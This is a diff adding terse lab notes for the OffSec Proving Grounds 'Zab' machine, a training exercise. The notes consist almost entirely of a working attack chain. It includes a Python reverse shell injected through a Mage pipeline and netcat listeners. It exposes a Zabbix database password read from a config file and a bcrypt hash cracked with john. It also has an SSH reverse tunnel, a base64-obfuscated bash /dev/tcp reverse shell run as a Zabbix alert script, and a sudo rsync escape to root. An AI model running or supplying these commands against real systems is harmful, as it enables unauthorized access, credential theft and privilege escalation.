@@ -1,0 +1,79 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.244.210 > Zab.txt
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 2e:5b:cb:6b:21:8c:fc:df:7b:c7:f7:f0:46:2e:6d:55 (ECDSA)
+|_  256 ab:1a:ce:a7:f0:b6:0f:79:0b:54:b8:00:26:3d:69:58 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+6789/tcp open  http    Tornado httpd 6.3.3
+|_http-server-header: TornadoServer/6.3.3
+| http-methods: 
+|_  Supported Methods: GET
+|_http-title: Mage
+|_http-favicon: Unknown favicon MD5: 14B7DB3EB16DEF7F593F14D8621E9BBB
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+http://192.168.244.210:6789/pipelines/project_name/edit?sideview=tree
+
+import socket,subprocess,os;s=socket.socket();
+s.connect(("192.168.45.154",443));os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
+subprocess.call(["/bin/sh","-i"])
+
+create and run python payload.
+
+$ rlwrap nc -nlvp 443
+listening on [any] 443 ...
+connect to [192.168.45.154] from (UNKNOWN) [192.168.244.210] 44956
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+Linux version 5.15.0-122-generic (buildd@lcy02-amd64-034) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #132-Ubuntu SMP Thu Aug 29 13:45:52 UTC 2024
+
+Sudo version 1.9.9
+
+cat /usr/share/doc/zabbix-agent/userparameter_mysql.conf
+#template_db_mysql.conf created by Zabbix for "Template DB MySQL" and Zabbix 4.2
+# Found /etc/zabbix
+
+www-data@zab:/etc/zabbix/web$ cat zabbix.conf.php
+$DB['TYPE']   = 'MYSQL';
+$DB['USER']   = 'zabbix';
+$DB['PASSWORD']   = 'breadandbuttereater121';
+
+Admin:$2y$10$KA6iPN5sY5.Z4KLerN7XOOO1P7jR8MD2e0SqNRXOsJjV1b.8c5Si.
+$ john --wordlist=/usr/share/wordlists/rockyou.txt adminhash
+Admin:dinosaur
+
+Refer to walkthrough: https://medium.com/@gayemans1003/offsec-proving-grounds-zab-walkthrough-4092a2c8c904
+
+ssh -N -R 127.0.0.1:80:127.0.0.1:80 alan@192.168.45.154
+
+http://127.0.0.1/zabbix/
+# Go Alerts scripts add:
+echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE1NC82Nzg5IDA+JjE=' | base64 -d | bash
+# then Go Monitoring Hosts: click Zabbix server to execute script.
+
+$ rlwrap nc -nlvp 6789
+listening on [any] 6789 ...
+connect to [192.168.45.154] from (UNKNOWN) [192.168.244.210] 55198
+bash: cannot set terminal process group (4183): Inappropriate ioctl for device
+bash: no job control in this shell
+zabbix@zab:/$ id
+id
+uid=114(zabbix) gid=120(zabbix) groups=120(zabbix)
+
+sudo -l
+(ALL : ALL) NOPASSWD: /usr/bin/rsync
+# https://gtfobins.org/gtfobins/rsync/#shell
+sudo rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+
